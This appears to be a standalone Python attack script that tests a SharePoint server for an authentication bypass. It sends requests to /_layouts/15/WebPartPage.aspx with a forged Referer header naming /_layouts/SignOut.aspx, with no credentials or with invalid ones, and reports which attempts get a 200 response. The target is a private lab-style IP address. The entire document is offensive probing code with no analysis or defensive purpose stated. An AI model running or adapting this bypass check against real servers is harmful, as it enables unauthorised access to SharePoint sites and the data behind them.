import requests
from requests.auth import HTTPBasicAuth

base_url = "http://10.10.10.166"
target = f"{base_url}/_layouts/15/WebPartPage.aspx"

auth_tests = [
    ("No credentials + bypass", None, {"Referer": "/_layouts/SignOut.aspx"}),
    ("Invalid credentials + bypass", HTTPBasicAuth("invalid", "invalid"), {"Referer": "/_layouts/SignOut.aspx"}),
    ("No credentials, no bypass", None, {}),
    ("Valid cookie attempt", None, {"Referer": "/_layouts/SignOut.aspx", "Cookie": "test=value"}),
]

for name, auth, headers in auth_tests:
    headers["User-Agent"] = "Mozilla/5.0"
    try:
        resp = requests.get(target, auth=auth, headers=headers, timeout=10)
        if resp.status_code == 200:
            print(f"✓ [{name}] Status: {resp.status_code}")
        elif resp.status_code == 401:
            print(f"✗ [{name}] Status: {resp.status_code}")
        else:
            print(f"? [{name}] Status: {resp.status_code}")
    except Exception as e:
        print(f"✗ [{name}] Error: {str(e)[:50]}")
